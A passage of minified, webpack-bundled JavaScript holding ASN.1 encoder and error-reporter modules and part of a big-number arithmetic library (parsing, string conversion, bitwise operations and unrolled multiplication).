                if (((this.reporter = reporter), state.optional && void 0 === data)) {
                    if (null === state.default) return;
                    data = state.default;
                }
                let content = null,
                    primitive = !1;
                if (state.any) result = this._createEncoderBuffer(data);
                else if (state.choice) result = this._encodeChoice(data, reporter);
                else if (state.contains) (content = this._getUse(state.contains, parent)._encode(data, reporter)), (primitive = !0);
                else if (state.children)
                    (content = state.children
                        .map(function (child) {
                            if ("null_" === child._baseState.tag) return child._encode(null, reporter, data);
                            if (null === child._baseState.key) return reporter.error("Child should have a key");
                            const prevKey = reporter.enterKey(child._baseState.key);
                            if ("object" != typeof data) return reporter.error("Child expected, but input is not object");
                            const res = child._encode(data[child._baseState.key], reporter, data);
                            return reporter.leaveKey(prevKey), res;
                        }, this)
                        .filter(function (child) {
                            return child;
                        })),
                        (content = this._createEncoderBuffer(content));
                else if ("seqof" === state.tag || "setof" === state.tag) {
                    if (!state.args || 1 !== state.args.length) return reporter.error("Too many args for : " + state.tag);
                    if (!Array.isArray(data)) return reporter.error("seqof/setof, but data is not Array");
                    const child = this.clone();
                    (child._baseState.implicit = null),
                        (content = this._createEncoderBuffer(
                            data.map(function (item) {
                                const state = this._baseState;
                                return this._getUse(state.args[0], data)._encode(item, reporter);
                            }, child)
                        ));
                } else null !== state.use ? (result = this._getUse(state.use, parent)._encode(data, reporter)) : ((content = this._encodePrimitive(state.tag, data)), (primitive = !0));
                if (!state.any && null === state.choice) {
                    const tag = null !== state.implicit ? state.implicit : state.tag,
                        cls = null === state.implicit ? "universal" : "context";
                    null === tag ? null === state.use && reporter.error("Tag could be omitted only for .use()") : null === state.use && (result = this._encodeComposite(tag, primitive, cls, content));
                }
                return null !== state.explicit && (result = this._encodeComposite(state.explicit, !1, "context", result)), result;
            }),
            (Node.prototype._encodeChoice = function (data, reporter) {
                const state = this._baseState,
                    node = state.choice[data.type];
                return node || assert(!1, data.type + " not found in " + JSON.stringify(Object.keys(state.choice))), node._encode(data.value, reporter);
            }),
            (Node.prototype._encodePrimitive = function (tag, data) {
                const state = this._baseState;
                if (/str$/.test(tag)) return this._encodeStr(data, tag);
                if ("objid" === tag && state.args) return this._encodeObjid(data, state.reverseArgs[0], state.args[1]);
                if ("objid" === tag) return this._encodeObjid(data, null, null);
                if ("gentime" === tag || "utctime" === tag) return this._encodeTime(data, tag);
                if ("null_" === tag) return this._encodeNull();
                if ("int" === tag || "enum" === tag) return this._encodeInt(data, state.args && state.reverseArgs[0]);
                if ("bool" === tag) return this._encodeBool(data);
                if ("objDesc" === tag) return this._encodeStr(data, tag);
                throw new Error("Unsupported tag: " + tag);
            }),
            (Node.prototype._isNumstr = function (str) {
                return /^[0-9 ]*$/.test(str);
            }),
            (Node.prototype._isPrintstr = function (str) {
                return /^[A-Za-z0-9 '()+,-./:=?]*$/.test(str);
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        const inherits = __webpack_require__(3);
        function Reporter(options) {
            this._reporterState = { obj: null, path: [], options: options || {}, errors: [] };
        }
        function ReporterError(path, msg) {
            (this.path = path), this.rethrow(msg);
        }
        (exports.Reporter = Reporter),
            (Reporter.prototype.isError = function (obj) {
                return obj instanceof ReporterError;
            }),
            (Reporter.prototype.save = function () {
                const state = this._reporterState;
                return { obj: state.obj, pathLen: state.path.length };
            }),
            (Reporter.prototype.restore = function (data) {
                const state = this._reporterState;
                (state.obj = data.obj), (state.path = state.path.slice(0, data.pathLen));
            }),
            (Reporter.prototype.enterKey = function (key) {
                return this._reporterState.path.push(key);
            }),
            (Reporter.prototype.exitKey = function (index) {
                const state = this._reporterState;
                state.path = state.path.slice(0, index - 1);
            }),
            (Reporter.prototype.leaveKey = function (index, key, value) {
                const state = this._reporterState;
                this.exitKey(index), null !== state.obj && (state.obj[key] = value);
            }),
            (Reporter.prototype.path = function () {
                return this._reporterState.path.join("/");
            }),
            (Reporter.prototype.enterObject = function () {
                const state = this._reporterState,
                    prev = state.obj;
                return (state.obj = {}), prev;
            }),
            (Reporter.prototype.leaveObject = function (prev) {
                const state = this._reporterState,
                    now = state.obj;
                return (state.obj = prev), now;
            }),
            (Reporter.prototype.error = function (msg) {
                let err;
                const state = this._reporterState,
                    inherited = msg instanceof ReporterError;
                if (
                    ((err = inherited
                        ? msg
                        : new ReporterError(
                              state.path
                                  .map(function (elem) {
                                      return "[" + JSON.stringify(elem) + "]";
                                  })
                                  .join(""),
                              msg.message || msg,
                              msg.stack
                          )),
                    !state.options.partial)
                )
                    throw err;
                return inherited || state.errors.push(err), err;
            }),
            (Reporter.prototype.wrapResult = function (result) {
                const state = this._reporterState;
                return state.options.partial ? { result: this.isError(result) ? null : result, errors: state.errors } : result;
            }),
            inherits(ReporterError, Error),
            (ReporterError.prototype.rethrow = function (msg) {
                if (((this.message = msg + " at: " + (this.path || "(shallow)")), Error.captureStackTrace && Error.captureStackTrace(this, ReporterError), !this.stack))
                    try {
                        throw new Error(this.message);
                    } catch (e) {
                        this.stack = e.stack;
                    }
                return this;
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        function reverse(map) {
            const res = {};
            return (
                Object.keys(map).forEach(function (key) {
                    (0 | key) == key && (key |= 0);
                    const value = map[key];
                    res[value] = key;
                }),
                res
            );
        }
        (exports.tagClass = { 0: "universal", 1: "application", 2: "context", 3: "private" }),
            (exports.tagClassByName = reverse(exports.tagClass)),
            (exports.tag = {
                0: "end",
                1: "bool",
                2: "int",
                3: "bitstr",
                4: "octstr",
                5: "null_",
                6: "objid",
                7: "objDesc",
                8: "external",
                9: "real",
                10: "enum",
                11: "embed",
                12: "utf8str",
                13: "relativeOid",
                16: "seq",
                17: "set",
                18: "numstr",
                19: "printstr",
                20: "t61str",
                21: "videostr",
                22: "ia5str",
                23: "utctime",
                24: "gentime",
                25: "graphstr",
                26: "iso646str",
                27: "genstr",
                28: "unistr",
                29: "charstr",
                30: "bmpstr",
            }),
            (exports.tagByName = reverse(exports.tag));
    },
    function (module, exports, __webpack_require__) {
        (function (module) {
            !(function (module, exports) {
                "use strict";
                function assert(val, msg) {
                    if (!val) throw new Error(msg || "Assertion failed");
                }
                function inherits(ctor, superCtor) {
                    ctor.super_ = superCtor;
                    var TempCtor = function () {};
                    (TempCtor.prototype = superCtor.prototype), (ctor.prototype = new TempCtor()), (ctor.prototype.constructor = ctor);
                }
                function BN(number, base, endian) {
                    if (BN.isBN(number)) return number;
                    (this.negative = 0),
                        (this.words = null),
                        (this.length = 0),
                        (this.red = null),
                        null !== number && (("le" !== base && "be" !== base) || ((endian = base), (base = 10)), this._init(number || 0, base || 10, endian || "be"));
                }
                var Buffer;
                "object" == typeof module ? (module.exports = BN) : (exports.BN = BN), (BN.BN = BN), (BN.wordSize = 26);
                try {
                    Buffer = "undefined" != typeof window && void 0 !== window.Buffer ? window.Buffer : __webpack_require__(286).Buffer;
                } catch (e) {}
                function parseHex4Bits(string, index) {
                    var c = string.charCodeAt(index);
                    return c >= 65 && c <= 70 ? c - 55 : c >= 97 && c <= 102 ? c - 87 : (c - 48) & 15;
                }
                function parseHexByte(string, lowerBound, index) {
                    var r = parseHex4Bits(string, index);
                    return index - 1 >= lowerBound && (r |= parseHex4Bits(string, index - 1) << 4), r;
                }
                function parseBase(str, start, end, mul) {
                    for (var r = 0, len = Math.min(str.length, end), i = start; i < len; i++) {
                        var c = str.charCodeAt(i) - 48;
                        (r *= mul), (r += c >= 49 ? c - 49 + 10 : c >= 17 ? c - 17 + 10 : c);
                    }
                    return r;
                }
                (BN.isBN = function (num) {
                    return num instanceof BN || (null !== num && "object" == typeof num && num.constructor.wordSize === BN.wordSize && Array.isArray(num.words));
                }),
                    (BN.max = function (left, right) {
                        return left.cmp(right) > 0 ? left : right;
                    }),
                    (BN.min = function (left, right) {
                        return left.cmp(right) < 0 ? left : right;
                    }),
                    (BN.prototype._init = function (number, base, endian) {
                        if ("number" == typeof number) return this._initNumber(number, base, endian);
                        if ("object" == typeof number) return this._initArray(number, base, endian);
                        "hex" === base && (base = 16), assert(base === (0 | base) && base >= 2 && base <= 36);
                        var start = 0;
                        "-" === (number = number.toString().replace(/\s+/g, ""))[0] && (start++, (this.negative = 1)),
                            start < number.length && (16 === base ? this._parseHex(number, start, endian) : (this._parseBase(number, base, start), "le" === endian && this._initArray(this.toArray(), base, endian)));
                    }),
                    (BN.prototype._initNumber = function (number, base, endian) {
                        number < 0 && ((this.negative = 1), (number = -number)),
                            number < 67108864
                                ? ((this.words = [67108863 & number]), (this.length = 1))
                                : number < 4503599627370496
                                ? ((this.words = [67108863 & number, (number / 67108864) & 67108863]), (this.length = 2))
                                : (assert(number < 9007199254740992), (this.words = [67108863 & number, (number / 67108864) & 67108863, 1]), (this.length = 3)),
                            "le" === endian && this._initArray(this.toArray(), base, endian);
                    }),
                    (BN.prototype._initArray = function (number, base, endian) {
                        if ((assert("number" == typeof number.length), number.length <= 0)) return (this.words = [0]), (this.length = 1), this;
                        (this.length = Math.ceil(number.length / 3)), (this.words = new Array(this.length));
                        for (var i = 0; i < this.length; i++) this.words[i] = 0;
                        var j,
                            w,
                            off = 0;
                        if ("be" === endian)
                            for (i = number.length - 1, j = 0; i >= 0; i -= 3)
                                (w = number[i] | (number[i - 1] << 8) | (number[i - 2] << 16)), (this.words[j] |= (w << off) & 67108863), (this.words[j + 1] = (w >>> (26 - off)) & 67108863), (off += 24) >= 26 && ((off -= 26), j++);
                        else if ("le" === endian)
                            for (i = 0, j = 0; i < number.length; i += 3)
                                (w = number[i] | (number[i + 1] << 8) | (number[i + 2] << 16)), (this.words[j] |= (w << off) & 67108863), (this.words[j + 1] = (w >>> (26 - off)) & 67108863), (off += 24) >= 26 && ((off -= 26), j++);
                        return this.strip();
                    }),
                    (BN.prototype._parseHex = function (number, start, endian) {
                        (this.length = Math.ceil((number.length - start) / 6)), (this.words = new Array(this.length));
                        for (var i = 0; i < this.length; i++) this.words[i] = 0;
                        var w,
                            off = 0,
                            j = 0;
                        if ("be" === endian)
                            for (i = number.length - 1; i >= start; i -= 2) (w = parseHexByte(number, start, i) << off), (this.words[j] |= 67108863 & w), off >= 18 ? ((off -= 18), (j += 1), (this.words[j] |= w >>> 26)) : (off += 8);
                        else
                            for (i = (number.length - start) % 2 == 0 ? start + 1 : start; i < number.length; i += 2)
                                (w = parseHexByte(number, start, i) << off), (this.words[j] |= 67108863 & w), off >= 18 ? ((off -= 18), (j += 1), (this.words[j] |= w >>> 26)) : (off += 8);
                        this.strip();
                    }),
                    (BN.prototype._parseBase = function (number, base, start) {
                        (this.words = [0]), (this.length = 1);
                        for (var limbLen = 0, limbPow = 1; limbPow <= 67108863; limbPow *= base) limbLen++;
                        limbLen--, (limbPow = (limbPow / base) | 0);
                        for (var total = number.length - start, mod = total % limbLen, end = Math.min(total, total - mod) + start, word = 0, i = start; i < end; i += limbLen)
                            (word = parseBase(number, i, i + limbLen, base)), this.imuln(limbPow), this.words[0] + word < 67108864 ? (this.words[0] += word) : this._iaddn(word);
                        if (0 !== mod) {
                            var pow = 1;
                            for (word = parseBase(number, i, number.length, base), i = 0; i < mod; i++) pow *= base;
                            this.imuln(pow), this.words[0] + word < 67108864 ? (this.words[0] += word) : this._iaddn(word);
                        }
                        this.strip();
                    }),
                    (BN.prototype.copy = function (dest) {
                        dest.words = new Array(this.length);
                        for (var i = 0; i < this.length; i++) dest.words[i] = this.words[i];
                        (dest.length = this.length), (dest.negative = this.negative), (dest.red = this.red);
                    }),
                    (BN.prototype.clone = function () {
                        var r = new BN(null);
                        return this.copy(r), r;
                    }),
                    (BN.prototype._expand = function (size) {
                        for (; this.length < size; ) this.words[this.length++] = 0;
                        return this;
                    }),
                    (BN.prototype.strip = function () {
                        for (; this.length > 1 && 0 === this.words[this.length - 1]; ) this.length--;
                        return this._normSign();
                    }),
                    (BN.prototype._normSign = function () {
                        return 1 === this.length && 0 === this.words[0] && (this.negative = 0), this;
                    }),
                    (BN.prototype.inspect = function () {
                        return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">";
                    });
                var zeros = [
                        "",
                        "0",
                        "00",
                        "000",
                        "0000",
                        "00000",
                        "000000",
                        "0000000",
                        "00000000",
                        "000000000",
                        "0000000000",
                        "00000000000",
                        "000000000000",
                        "0000000000000",
                        "00000000000000",
                        "000000000000000",
                        "0000000000000000",
                        "00000000000000000",
                        "000000000000000000",
                        "0000000000000000000",
                        "00000000000000000000",
                        "000000000000000000000",
                        "0000000000000000000000",
                        "00000000000000000000000",
                        "000000000000000000000000",
                        "0000000000000000000000000",
                    ],
                    groupSizes = [0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5],
                    groupBases = [
                        0,
                        0,
                        33554432,
                        43046721,
                        16777216,
                        48828125,
                        60466176,
                        40353607,
                        16777216,
                        43046721,
                        1e7,
                        19487171,
                        35831808,
                        62748517,
                        7529536,
                        11390625,
                        16777216,
                        24137569,
                        34012224,
                        47045881,
                        64e6,
                        4084101,
                        5153632,
                        6436343,
                        7962624,
                        9765625,
                        11881376,
                        14348907,
                        17210368,
                        20511149,
                        243e5,
                        28629151,
                        33554432,
                        39135393,
                        45435424,
                        52521875,
                        60466176,
                    ];
                function smallMulTo(self, num, out) {
                    out.negative = num.negative ^ self.negative;
                    var len = (self.length + num.length) | 0;
                    (out.length = len), (len = (len - 1) | 0);
                    var a = 0 | self.words[0],
                        b = 0 | num.words[0],
                        r = a * b,
                        lo = 67108863 & r,
                        carry = (r / 67108864) | 0;
                    out.words[0] = lo;
                    for (var k = 1; k < len; k++) {
                        for (var ncarry = carry >>> 26, rword = 67108863 & carry, maxJ = Math.min(k, num.length - 1), j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
                            var i = (k - j) | 0;
                            (ncarry += ((r = (a = 0 | self.words[i]) * (b = 0 | num.words[j]) + rword) / 67108864) | 0), (rword = 67108863 & r);
                        }
                        (out.words[k] = 0 | rword), (carry = 0 | ncarry);
                    }
                    return 0 !== carry ? (out.words[k] = 0 | carry) : out.length--, out.strip();
                }
                (BN.prototype.toString = function (base, padding) {
                    var out;
                    if (((padding = 0 | padding || 1), 16 === (base = base || 10) || "hex" === base)) {
                        out = "";
                        for (var off = 0, carry = 0, i = 0; i < this.length; i++) {
                            var w = this.words[i],
                                word = (16777215 & ((w << off) | carry)).toString(16);
                            (out = 0 !== (carry = (w >>> (24 - off)) & 16777215) || i !== this.length - 1 ? zeros[6 - word.length] + word + out : word + out), (off += 2) >= 26 && ((off -= 26), i--);
                        }
                        for (0 !== carry && (out = carry.toString(16) + out); out.length % padding != 0; ) out = "0" + out;
                        return 0 !== this.negative && (out = "-" + out), out;
                    }
                    if (base === (0 | base) && base >= 2 && base <= 36) {
                        var groupSize = groupSizes[base],
                            groupBase = groupBases[base];
                        out = "";
                        var c = this.clone();
                        for (c.negative = 0; !c.isZero(); ) {
                            var r = c.modn(groupBase).toString(base);
                            out = (c = c.idivn(groupBase)).isZero() ? r + out : zeros[groupSize - r.length] + r + out;
                        }
                        for (this.isZero() && (out = "0" + out); out.length % padding != 0; ) out = "0" + out;
                        return 0 !== this.negative && (out = "-" + out), out;
                    }
                    assert(!1, "Base should be between 2 and 36");
                }),
                    (BN.prototype.toNumber = function () {
                        var ret = this.words[0];
                        return (
                            2 === this.length
                                ? (ret += 67108864 * this.words[1])
                                : 3 === this.length && 1 === this.words[2]
                                ? (ret += 4503599627370496 + 67108864 * this.words[1])
                                : this.length > 2 && assert(!1, "Number can only safely store up to 53 bits"),
                            0 !== this.negative ? -ret : ret
                        );
                    }),
                    (BN.prototype.toJSON = function () {
                        return this.toString(16);
                    }),
                    (BN.prototype.toBuffer = function (endian, length) {
                        return assert(void 0 !== Buffer), this.toArrayLike(Buffer, endian, length);
                    }),
                    (BN.prototype.toArray = function (endian, length) {
                        return this.toArrayLike(Array, endian, length);
                    }),
                    (BN.prototype.toArrayLike = function (ArrayType, endian, length) {
                        var byteLength = this.byteLength(),
                            reqLength = length || Math.max(1, byteLength);
                        assert(byteLength <= reqLength, "byte array longer than desired length"), assert(reqLength > 0, "Requested array length <= 0"), this.strip();
                        var b,
                            i,
                            littleEndian = "le" === endian,
                            res = new ArrayType(reqLength),
                            q = this.clone();
                        if (littleEndian) {
                            for (i = 0; !q.isZero(); i++) (b = q.andln(255)), q.iushrn(8), (res[i] = b);
                            for (; i < reqLength; i++) res[i] = 0;
                        } else {
                            for (i = 0; i < reqLength - byteLength; i++) res[i] = 0;
                            for (i = 0; !q.isZero(); i++) (b = q.andln(255)), q.iushrn(8), (res[reqLength - i - 1] = b);
                        }
                        return res;
                    }),
                    Math.clz32
                        ? (BN.prototype._countBits = function (w) {
                              return 32 - Math.clz32(w);
                          })
                        : (BN.prototype._countBits = function (w) {
                              var t = w,
                                  r = 0;
                              return t >= 4096 && ((r += 13), (t >>>= 13)), t >= 64 && ((r += 7), (t >>>= 7)), t >= 8 && ((r += 4), (t >>>= 4)), t >= 2 && ((r += 2), (t >>>= 2)), r + t;
                          }),
                    (BN.prototype._zeroBits = function (w) {
                        if (0 === w) return 26;
                        var t = w,
                            r = 0;
                        return 0 == (8191 & t) && ((r += 13), (t >>>= 13)), 0 == (127 & t) && ((r += 7), (t >>>= 7)), 0 == (15 & t) && ((r += 4), (t >>>= 4)), 0 == (3 & t) && ((r += 2), (t >>>= 2)), 0 == (1 & t) && r++, r;
                    }),
                    (BN.prototype.bitLength = function () {
                        var w = this.words[this.length - 1],
                            hi = this._countBits(w);
                        return 26 * (this.length - 1) + hi;
                    }),
                    (BN.prototype.zeroBits = function () {
                        if (this.isZero()) return 0;
                        for (var r = 0, i = 0; i < this.length; i++) {
                            var b = this._zeroBits(this.words[i]);
                            if (((r += b), 26 !== b)) break;
                        }
                        return r;
                    }),
                    (BN.prototype.byteLength = function () {
                        return Math.ceil(this.bitLength() / 8);
                    }),
                    (BN.prototype.toTwos = function (width) {
                        return 0 !== this.negative ? this.abs().inotn(width).iaddn(1) : this.clone();
                    }),
                    (BN.prototype.fromTwos = function (width) {
                        return this.testn(width - 1) ? this.notn(width).iaddn(1).ineg() : this.clone();
                    }),
                    (BN.prototype.isNeg = function () {
                        return 0 !== this.negative;
                    }),
                    (BN.prototype.neg = function () {
                        return this.clone().ineg();
                    }),
                    (BN.prototype.ineg = function () {
                        return this.isZero() || (this.negative ^= 1), this;
                    }),
                    (BN.prototype.iuor = function (num) {
                        for (; this.length < num.length; ) this.words[this.length++] = 0;
                        for (var i = 0; i < num.length; i++) this.words[i] = this.words[i] | num.words[i];
                        return this.strip();
                    }),
                    (BN.prototype.ior = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuor(num);
                    }),
                    (BN.prototype.or = function (num) {
                        return this.length > num.length ? this.clone().ior(num) : num.clone().ior(this);
                    }),
                    (BN.prototype.uor = function (num) {
                        return this.length > num.length ? this.clone().iuor(num) : num.clone().iuor(this);
                    }),
                    (BN.prototype.iuand = function (num) {
                        var b;
                        b = this.length > num.length ? num : this;
                        for (var i = 0; i < b.length; i++) this.words[i] = this.words[i] & num.words[i];
                        return (this.length = b.length), this.strip();
                    }),
                    (BN.prototype.iand = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuand(num);
                    }),
                    (BN.prototype.and = function (num) {
                        return this.length > num.length ? this.clone().iand(num) : num.clone().iand(this);
                    }),
                    (BN.prototype.uand = function (num) {
                        return this.length > num.length ? this.clone().iuand(num) : num.clone().iuand(this);
                    }),
                    (BN.prototype.iuxor = function (num) {
                        var a, b;
                        this.length > num.length ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var i = 0; i < b.length; i++) this.words[i] = a.words[i] ^ b.words[i];
                        if (this !== a) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return (this.length = a.length), this.strip();
                    }),
                    (BN.prototype.ixor = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuxor(num);
                    }),
                    (BN.prototype.xor = function (num) {
                        return this.length > num.length ? this.clone().ixor(num) : num.clone().ixor(this);
                    }),
                    (BN.prototype.uxor = function (num) {
                        return this.length > num.length ? this.clone().iuxor(num) : num.clone().iuxor(this);
                    }),
                    (BN.prototype.inotn = function (width) {
                        assert("number" == typeof width && width >= 0);
                        var bytesNeeded = 0 | Math.ceil(width / 26),
                            bitsLeft = width % 26;
                        this._expand(bytesNeeded), bitsLeft > 0 && bytesNeeded--;
                        for (var i = 0; i < bytesNeeded; i++) this.words[i] = 67108863 & ~this.words[i];
                        return bitsLeft > 0 && (this.words[i] = ~this.words[i] & (67108863 >> (26 - bitsLeft))), this.strip();
                    }),
                    (BN.prototype.notn = function (width) {
                        return this.clone().inotn(width);
                    }),
                    (BN.prototype.setn = function (bit, val) {
                        assert("number" == typeof bit && bit >= 0);
                        var off = (bit / 26) | 0,
                            wbit = bit % 26;
                        return this._expand(off + 1), (this.words[off] = val ? this.words[off] | (1 << wbit) : this.words[off] & ~(1 << wbit)), this.strip();
                    }),
                    (BN.prototype.iadd = function (num) {
                        var r, a, b;
                        if (0 !== this.negative && 0 === num.negative) return (this.negative = 0), (r = this.isub(num)), (this.negative ^= 1), this._normSign();
                        if (0 === this.negative && 0 !== num.negative) return (num.negative = 0), (r = this.isub(num)), (num.negative = 1), r._normSign();
                        this.length > num.length ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var carry = 0, i = 0; i < b.length; i++) (r = (0 | a.words[i]) + (0 | b.words[i]) + carry), (this.words[i] = 67108863 & r), (carry = r >>> 26);
                        for (; 0 !== carry && i < a.length; i++) (r = (0 | a.words[i]) + carry), (this.words[i] = 67108863 & r), (carry = r >>> 26);
                        if (((this.length = a.length), 0 !== carry)) (this.words[this.length] = carry), this.length++;
                        else if (a !== this) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return this;
                    }),
                    (BN.prototype.add = function (num) {
                        var res;
                        return 0 !== num.negative && 0 === this.negative
                            ? ((num.negative = 0), (res = this.sub(num)), (num.negative ^= 1), res)
                            : 0 === num.negative && 0 !== this.negative
                            ? ((this.negative = 0), (res = num.sub(this)), (this.negative = 1), res)
                            : this.length > num.length
                            ? this.clone().iadd(num)
                            : num.clone().iadd(this);
                    }),
                    (BN.prototype.isub = function (num) {
                        if (0 !== num.negative) {
                            num.negative = 0;
                            var r = this.iadd(num);
                            return (num.negative = 1), r._normSign();
                        }
                        if (0 !== this.negative) return (this.negative = 0), this.iadd(num), (this.negative = 1), this._normSign();
                        var a,
                            b,
                            cmp = this.cmp(num);
                        if (0 === cmp) return (this.negative = 0), (this.length = 1), (this.words[0] = 0), this;
                        cmp > 0 ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var carry = 0, i = 0; i < b.length; i++) (carry = (r = (0 | a.words[i]) - (0 | b.words[i]) + carry) >> 26), (this.words[i] = 67108863 & r);
                        for (; 0 !== carry && i < a.length; i++) (carry = (r = (0 | a.words[i]) + carry) >> 26), (this.words[i] = 67108863 & r);
                        if (0 === carry && i < a.length && a !== this) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return (this.length = Math.max(this.length, i)), a !== this && (this.negative = 1), this.strip();
                    }),
                    (BN.prototype.sub = function (num) {
                        return this.clone().isub(num);
                    });
                var comb10MulTo = function (self, num, out) {
                    var lo,
                        mid,
                        hi,
                        a = self.words,
                        b = num.words,
                        o = out.words,
                        c = 0,
                        a0 = 0 | a[0],
                        al0 = 8191 & a0,
                        ah0 = a0 >>> 13,
                        a1 = 0 | a[1],
                        al1 = 8191 & a1,
                        ah1 = a1 >>> 13,
                        a2 = 0 | a[2],
                        al2 = 8191 & a2,
                        ah2 = a2 >>> 13,
                        a3 = 0 | a[3],
                        al3 = 8191 & a3,
                        ah3 = a3 >>> 13,
                        a4 = 0 | a[4],
                        al4 = 8191 & a4,
                        ah4 = a4 >>> 13,
                        a5 = 0 | a[5],
                        al5 = 8191 & a5,
                        ah5 = a5 >>> 13,
                        a6 = 0 | a[6],
                        al6 = 8191 & a6,
                        ah6 = a6 >>> 13,
                        a7 = 0 | a[7],
                        al7 = 8191 & a7,
                        ah7 = a7 >>> 13,
                        a8 = 0 | a[8],
                        al8 = 8191 & a8,
                        ah8 = a8 >>> 13,
                        a9 = 0 | a[9],
                        al9 = 8191 & a9,
                        ah9 = a9 >>> 13,
                        b0 = 0 | b[0],
                        bl0 = 8191 & b0,
                        bh0 = b0 >>> 13,
                        b1 = 0 | b[1],
                        bl1 = 8191 & b1,
                        bh1 = b1 >>> 13,
                        b2 = 0 | b[2],
                        bl2 = 8191 & b2,
                        bh2 = b2 >>> 13,
                        b3 = 0 | b[3],
                        bl3 = 8191 & b3,
                        bh3 = b3 >>> 13,
                        b4 = 0 | b[4],
                        bl4 = 8191 & b4,
                        bh4 = b4 >>> 13,
                        b5 = 0 | b[5],
                        bl5 = 8191 & b5,
                        bh5 = b5 >>> 13,
                        b6 = 0 | b[6],
                        bl6 = 8191 & b6,
                        bh6 = b6 >>> 13,
                        b7 = 0 | b[7],
                        bl7 = 8191 & b7,
                        bh7 = b7 >>> 13,
                        b8 = 0 | b[8],
                        bl8 = 8191 & b8,
                        bh8 = b8 >>> 13,
                        b9 = 0 | b[9],
                        bl9 = 8191 & b9,
                        bh9 = b9 >>> 13;
                    (out.negative = self.negative ^ num.negative), (out.length = 19);
                    var w0 = (((c + (lo = Math.imul(al0, bl0))) | 0) + ((8191 & (mid = ((mid = Math.imul(al0, bh0)) + Math.imul(ah0, bl0)) | 0)) << 13)) | 0;
                    (c = ((((hi = Math.imul(ah0, bh0)) + (mid >>> 13)) | 0) + (w0 >>> 26)) | 0), (w0 &= 67108863), (lo = Math.imul(al1, bl0)), (mid = ((mid = Math.imul(al1, bh0)) + Math.imul(ah1, bl0)) | 0), (hi = Math.imul(ah1, bh0));
                    var w1 = (((c + (lo = (lo + Math.imul(al0, bl1)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh1)) | 0) + Math.imul(ah0, bl1)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh1)) | 0) + (mid >>> 13)) | 0) + (w1 >>> 26)) | 0),
                        (w1 &= 67108863),
                        (lo = Math.imul(al2, bl0)),
                        (mid = ((mid = Math.imul(al2, bh0)) + Math.imul(ah2, bl0)) | 0),
                        (hi = Math.imul(ah2, bh0)),
                        (lo = (lo + Math.imul(al1, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh1)) | 0) + Math.imul(ah1, bl1)) | 0),
                        (hi = (hi + Math.imul(ah1, bh1)) | 0);
                    var w2 = (((c + (lo = (lo + Math.imul(al0, bl2)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh2)) | 0) + Math.imul(ah0, bl2)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh2)) | 0) + (mid >>> 13)) | 0) + (w2 >>> 26)) | 0),
                        (w2 &= 67108863),
                        (lo = Math.imul(al3, bl0)),
                        (mid = ((mid = Math.imul(al3, bh0)) + Math.imul(ah3, bl0)) | 0),
                        (hi = Math.imul(ah3, bh0)),
                        (lo = (lo + Math.imul(al2, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh1)) | 0) + Math.imul(ah2, bl1)) | 0),
                        (hi = (hi + Math.imul(ah2, bh1)) | 0),
                        (lo = (lo + Math.imul(al1, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh2)) | 0) + Math.imul(ah1, bl2)) | 0),
                        (hi = (hi + Math.imul(ah1, bh2)) | 0);
                    var w3 = (((c + (lo = (lo + Math.imul(al0, bl3)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh3)) | 0) + Math.imul(ah0, bl3)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh3)) | 0) + (mid >>> 13)) | 0) + (w3 >>> 26)) | 0),
                        (w3 &= 67108863),
                        (lo = Math.imul(al4, bl0)),
                        (mid = ((mid = Math.imul(al4, bh0)) + Math.imul(ah4, bl0)) | 0),
                        (hi = Math.imul(ah4, bh0)),
                        (lo = (lo + Math.imul(al3, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh1)) | 0) + Math.imul(ah3, bl1)) | 0),
                        (hi = (hi + Math.imul(ah3, bh1)) | 0),
                        (lo = (lo + Math.imul(al2, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh2)) | 0) + Math.imul(ah2, bl2)) | 0),
                        (hi = (hi + Math.imul(ah2, bh2)) | 0),
                        (lo = (lo + Math.imul(al1, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh3)) | 0) + Math.imul(ah1, bl3)) | 0),
                        (hi = (hi + Math.imul(ah1, bh3)) | 0);
                    var w4 = (((c + (lo = (lo + Math.imul(al0, bl4)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh4)) | 0) + Math.imul(ah0, bl4)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh4)) | 0) + (mid >>> 13)) | 0) + (w4 >>> 26)) | 0),
                        (w4 &= 67108863),
                        (lo = Math.imul(al5, bl0)),
                        (mid = ((mid = Math.imul(al5, bh0)) + Math.imul(ah5, bl0)) | 0),
                        (hi = Math.imul(ah5, bh0)),
                        (lo = (lo + Math.imul(al4, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh1)) | 0) + Math.imul(ah4, bl1)) | 0),
                        (hi = (hi + Math.imul(ah4, bh1)) | 0),
                        (lo = (lo + Math.imul(al3, bl2)) | 0),
